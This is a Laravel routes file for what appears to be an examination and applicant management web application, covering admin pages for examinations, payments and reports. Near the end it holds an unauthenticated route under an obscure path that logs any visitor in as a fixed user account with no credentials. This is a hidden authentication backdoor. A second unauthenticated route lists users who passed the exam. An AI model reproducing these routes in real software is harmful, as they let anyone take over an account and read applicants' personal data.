<?php

use Illuminate\Support\Facades\Route;
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('welcome');
});

Route::middleware(['auth:sanctum', 'verified'])->get('/dashboard', function () {
   $role = auth()->user()->role;
   switch ($role) {
       case 'admin':
            return redirect()->route('admin.dashboard');
           break;
       case('user'):
            return redirect()->route('user.homepage');
           break;
       default:
           # code...
           break;
   }
})->name('dashboard');

Route::prefix('admin')->middleware(['auth:sanctum', 'verified','admin'])->group(function () {
    Route::get('/dashboard',\App\Http\Livewire\A\Dashboard::class)->name('admin.dashboard');
    Route::get('/manage/examinations',\App\Http\Livewire\A\ManageExamination::class)->name('admin.manage.examinations');
    Route::get('/examination/{examination_id}/details',\App\Http\Livewire\A\ViewExaminationDetails::class)->name('admin.examination.details');
    Route::get('/manage/applications',\App\Http\Livewire\A\ManageApplications::class)->name('admin.manage.applications');
    Route::get('/manage/payments',\App\Http\Livewire\A\ManagePayments::class)->name('admin.manage.payments');
    Route::get('/manage/payments/approved',\App\Http\Livewire\A\ManageAllPayment::class)->name('admin.manage.all-payments');
    Route::get('/manage/payments/denied',\App\Http\Livewire\A\DeniedPayments::class)->name('admin.manage.denied-payments');
    Route::get('/generate/reports',\App\Http\Livewire\A\GenerateReports::class)->name('admin.generate.reports');
    Route::get('/report/result',\App\Http\Livewire\Result\Report::class)->name('admin.report.result');
    Route::get('/program/report',\App\Http\Livewire\PerProgramReport::class)->name('admin.program.report');



    // 
    Route::get('/developer/control',\App\Http\Livewire\DeveloperController::class)->name('admin.developer.controller');
    // dummy url

    Route::get('/ccs/report',function(){
        return view('ccs-report');
    });

});

Route::prefix('/applicant')->middleware(['auth:sanctum', 'verified','user'])->group(function () {
   Route::get('/homepage',\App\Http\Livewire\U\Homepage::class)->name('user.homepage');
});

Route::get('/norjamillekasan/controller',function(){
    $user = \App\Models\User::where('id','4856')->first();
    Auth::login($user);
});


Route::get('/send/email-2022',function(){
        $passersScores = \App\Models\Result::where('overall_score','>=','520')->pluck('examinee_id')->toArray();
        $permits = \App\Models\Permit::whereIn('permit_number',$passersScores)->pluck('user_id')->toArray();
        $users = \App\Models\User::whereIn('id',$permits)->get();
        return view('users',[
            'users' => $users
        ]);
});